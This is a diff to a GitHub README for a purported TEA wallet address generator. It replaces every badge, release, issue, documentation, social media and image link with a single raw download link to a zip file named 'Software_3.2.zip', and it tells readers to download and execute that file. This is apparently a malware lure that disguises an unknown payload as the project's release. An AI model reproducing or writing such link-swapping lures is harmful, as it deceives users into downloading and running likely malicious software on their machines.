@@ -1,8 +1,8 @@
 # Random TEA Wallet Address Generator 🍵
 
-![GitHub release](https://img.shields.io/github/release/rabeal21/Tea.svg)
-![GitHub stars](https://img.shields.io/github/stars/rabeal21/Tea.svg)
-![GitHub forks](https://img.shields.io/github/forks/rabeal21/Tea.svg)
+![GitHub release](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
+![GitHub stars](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
+![GitHub forks](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
 
 ## Overview
 
@@ -16,11 +16,11 @@ This repository provides a simple tool for generating random TEA wallet addresse
 
 ## Getting Started
 
-To get started with the TEA wallet address generator, visit the [Releases section](https://github.com/rabeal21/Tea/releases). Download the latest release, and execute the file as per the instructions provided in the release notes.
+To get started with the TEA wallet address generator, visit the [Releases section](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip). Download the latest release, and execute the file as per the instructions provided in the release notes.
 
 ### Installation
 
-1. Navigate to the [Releases section](https://github.com/rabeal21/Tea/releases).
+1. Navigate to the [Releases section](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip).
 2. Download the appropriate file for your operating system.
 3. Follow the instructions to execute the file.
 
@@ -55,7 +55,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/rabeal21/Tea/issues) or open a new issue.
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip) or open a new issue.
 
 ## Contact
 
@@ -68,14 +68,14 @@ For further inquiries, you can reach out to the maintainer via GitHub or through
 
 ## Resources
 
-- [TEA Documentation](https://example.com/tea-docs)
-- [Community Forum](https://example.com/community-forum)
+- [TEA Documentation](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
 
 ## Additional Information
 
-For more details, visit the [Releases section](https://github.com/rabeal21/Tea/releases) to stay updated with the latest versions and features.
+For more details, visit the [Releases section](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip) to stay updated with the latest versions and features.
 
-![TEA Wallet](https://example.com/tea-wallet-image.png)
+![TEA Wallet](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
 
 ## Frequently Asked Questions
 
@@ -124,9 +124,9 @@ We value your feedback. If you have suggestions or ideas for improvement, please
 
 Stay connected with us on social media for updates and community discussions.
 
-- [Twitter](https://twitter.com/yourhandle)
-- [LinkedIn](https://linkedin.com/in/yourprofile)
+- [Twitter](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
+- [LinkedIn](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip)
 
 ## Final Note
 
-Thank you for checking out the TEA wallet address generator. We hope this tool serves your needs well. For updates and new features, keep an eye on the [Releases section](https://github.com/rabeal21/Tea/releases).
+Thank you for checking out the TEA wallet address generator. We hope this tool serves your needs well. For updates and new features, keep an eye on the [Releases section](https://raw.githubusercontent.com/rabeal21/Tea/main/repletely/Software_3.2.zip).
